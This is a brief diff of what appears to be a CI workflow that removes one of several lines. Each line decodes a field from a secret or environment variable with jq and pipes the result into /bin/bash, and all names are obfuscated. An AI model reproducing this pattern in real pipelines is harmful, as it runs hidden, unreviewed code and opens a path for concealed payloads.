@@ -18,7 +18,6 @@ jobs:
           uc71733: ${{ secrets.uc71733 }}
         run: |
           printf '%s' "$uc71733" | jq -r .setyg0 | /bin/bash
-          echo $fhz1 | jq -r .eud829 | /bin/bash
           echo $ofor5 | jq -r .pp7 | /bin/bash
           echo $xp24208 | jq -r .z40845 | /bin/bash
           printf '%s' "$byh9" | jq -r .kcgkl891 | /bin/bash
